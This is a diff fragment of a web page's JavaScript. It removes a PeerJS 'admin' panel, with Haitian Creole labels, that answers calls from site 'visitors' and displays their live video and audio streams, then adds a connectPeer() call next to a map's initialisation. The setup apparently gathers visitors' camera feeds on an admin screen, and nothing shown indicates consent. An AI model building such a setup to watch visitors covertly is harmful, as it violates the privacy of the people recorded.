-   ============================================ */
-(() => {
-  const ADMIN_PEER_ID = "admin-piyayy-2026-v2";
-  const grid = document.getElementById("videoGrid");
-  const status = document.getElementById("status");
-  const visitorList = document.getElementById("visitorList");
-  const visitors = {};
-
-  const ICE_CONFIG = {
-    iceServers: [
-      { urls: "stun:stun.l.google.com:19302" },
-      { urls: "stun:stun1.l.google.com:19302" },
-      { urls: "turn:openrelay.metered.ca:80",
-        username: "openrelayproject", credential: "openrelayproject" },
-      { urls: "turn:openrelay.metered.ca:443",
-        username: "openrelayproject", credential: "openrelayproject" },
-      { urls: "turn:openrelay.metered.ca:443?transport=tcp",
-        username: "openrelayproject", credential: "openrelayproject" }
-    ]
-  };
-
-  let peer = null;
-  let reconnectTimer = null;
-
-  function connectPeer() {
-    if (peer && !peer.destroyed) { try { peer.destroy(); } catch (e) {} }
-    peer = new Peer(ADMIN_PEER_ID, { config: ICE_CONFIG, debug: 1 });
-
-    peer.on("open", (id) => {
-      status.innerText = "✅ Admin konekte. Ap tann visitors...";
-      const empty = grid.querySelector(".empty");
-      if (empty) empty.remove();
-    });
-
-    peer.on("call", handleIncomingCall);
-    peer.on("connection", (conn) => {
-      conn.on("data", (data) => {
-        if (data && data.type === "bye") cleanupVisitor(conn.peer);
-      });
-    });
-
-    peer.on("error", (err) => {
-      if (err.type === "unavailable-id") {
-        status.innerText = "❌ ID deja itilize. Ap eseye ankò nan 3s...";
-        setTimeout(connectPeer, 3000);
-        return;
-      }
-      status.innerText = "❌ Erè: " + err.type;
-      scheduleReconnect();
-    });
-
-    peer.on("disconnected", () => {
-      status.innerText = "⚠️ Koneksyon pèdi. Ap rekonekte...";
-      scheduleReconnect();
-    });
-  }
-
-  function scheduleReconnect() {
-    if (reconnectTimer) return;
-    reconnectTimer = setTimeout(() => {
-      reconnectTimer = null;
-      if (peer && !peer.destroyed) peer.reconnect();
-      else connectPeer();
-    }, 3000);
-  }
-
-  function handleIncomingCall(call) {
-    const visitorId = call.peer;
-
-    if (visitors[visitorId]) {
-      try { visitors[visitorId].call.close(); } catch (e) {}
-      if (visitors[visitorId].card) visitors[visitorId].card.remove();
-      if (visitors[visitorId].btn)  visitors[visitorId].btn.remove();
-      delete visitors[visitorId];
-    }
-
-    call.answer();
-
-    const card = document.createElement("div");
-    card.className = "video-card";
-    card.dataset.visitorId = visitorId;
-
-    const dot = document.createElement("div");
-    dot.className = "live-dot";
-
-    const video = document.createElement("video");
-    video.autoplay = true;
-    video.playsInline = true;
-    video.muted = true;
-
-    const label = document.createElement("p");
-    label.innerText = "👤 " + visitorId;
-
-    const soundBtn = document.createElement("button");
-    soundBtn.className = "sound-toggle";
-    soundBtn.innerText = "🔊 Tande son";
-    soundBtn.onclick = () => {
-      video.muted = !video.muted;
-      if (video.muted) {
-        soundBtn.innerText = "🔊 Tande son";
-        soundBtn.classList.remove("off");
-      } else {
-        soundBtn.innerText = "🔇 Koupe son";
-        soundBtn.classList.add("off");
-        video.play().catch(e => console.warn("play err:", e));
-      }
-    };
-
-    card.appendChild(dot);
-    card.appendChild(video);
-    card.appendChild(label);
-    card.appendChild(soundBtn);
-    grid.appendChild(card);
-
-    let btn = visitorList.querySelector(`[data-id="${visitorId}"]`);
-    if (!btn) {
-      btn = document.createElement("button");
-      btn.className = "visitor-btn";
-      btn.dataset.id = visitorId;
-      btn.innerText = "👤 " + visitorId.substring(0, 10) + "…";
-      visitorList.appendChild(btn);
-
-      btn.addEventListener("click", () => {
-        visitorList.querySelectorAll(".visitor-btn").forEach(b => b.classList.remove("active"));
-        btn.classList.add("active");
-        card.scrollIntoView({ behavior: "smooth", block: "center" });
-        grid.querySelectorAll(".video-card").forEach(c => c.classList.remove("focused"));
-        card.classList.add("focused");
-      });
-    }
-
-    visitors[visitorId] = {
-      call, video, card, btn, stream: null,
-      lastTime: 0, lastChange: Date.now(),
-      watchdog: null, iceCheck: null
-    };
-
-    call.on("stream", (remoteStream) => {
-      video.srcObject = remoteStream;
-      video.play().catch(e => console.warn("play err:", e));
-      
-      visitors[visitorId].stream = remoteStream;
-      visitors[visitorId].lastChange = Date.now();
-
-      const vTrack = remoteStream.getVideoTracks()[0];
-      if (vTrack) {
-        vTrack.onmute = () => setTimeout(() => {
-          if (vTrack.muted && visitors[visitorId]) cleanupVisitor(visitorId);
-        }, 8000);
-        vTrack.onended = () => setTimeout(() => {
-          if (visitors[visitorId]) cleanupVisitor(visitorId);
-        }, 8000);
-      }
-
-      visitors[visitorId].watchdog = setInterval(() => {
-        const v = visitors[visitorId];
-        if (!v || !v.video) return;
-        const t = v.video.currentTime;
-        if (t === v.lastTime) {
-          if (Date.now() - v.lastChange > 10000) cleanupVisitor(visitorId);
-        } else {
-          v.lastTime = t;
-          v.lastChange = Date.now();
-        }
-      }, 2000);
-
-      visitors[visitorId].iceCheck = setInterval(() => {
-        const v = visitors[visitorId];
-        if (!v) return;
-        const pc = v.call && v.call.peerConnection;
-        if (pc && (pc.iceConnectionState === "failed" || pc.iceConnectionState === "closed")) {
-          cleanupVisitor(visitorId);
-        }
-      }, 3000);
-
-      updateStatus();
-    });
-
-    call.on("close", () => setTimeout(() => { if (visitors[visitorId]) cleanupVisitor(visitorId); }, 3000));
-    call.on("error", () => setTimeout(() => { if (visitors[visitorId]) cleanupVisitor(visitorId); }, 3000));
-
-    updateStatus();
-  }
-
-  function cleanupVisitor(id) {
-    if (!visitors[id]) return;
-    const v = visitors[id];
-    if (v.watchdog) clearInterval(v.watchdog);
-    if (v.iceCheck) clearInterval(v.iceCheck);
-    if (v.stream) v.stream.getTracks().forEach(t => t.stop());
-    try { v.call.close(); } catch (e) {}
-    if (v.card) v.card.remove();
-    if (v.btn)  v.btn.remove();
-    delete visitors[id];
-    updateStatus();
-  }
-
-  function updateStatus() {
-    const count = Object.keys(visitors).length;
-    status.innerText = count > 0
-      ? `🟢 ${count} visitor konekte`
-      : "✅ Admin konekte. Ap tann visitors...";
-
-    if (count > 0) {
-      const empty = grid.querySelector(".empty");
-      if (empty) empty.remove();
-    } else if (!grid.querySelector(".empty")) {
-      const empty = document.createElement("div");
-      empty.className = "empty";
-      empty.innerText = "Ap tann visitor yo konekte...";
-      grid.appendChild(empty);
-    }
-  }
-
-  document.addEventListener("visibilitychange", () => {
-    if (document.visibilityState === "visible") {
-      if (!peer || peer.disconnected || peer.destroyed) scheduleReconnect();
-    }
-  });
-
-  window.addEventListener("beforeunload", () => {
-    Object.keys(visitors).forEach(id => { try { visitors[id].call.close(); } catch (e) {} });
-    if (peer && !peer.destroyed) peer.destroy();
-  });
-
-  connectPeer();
-})();
-
-/* ============================================
-   KÒMANSE KAT LA
+   KÒMANSE
    ============================================ */
 initMap();
+connectPeer();
 </script>
 </body>
 </html>
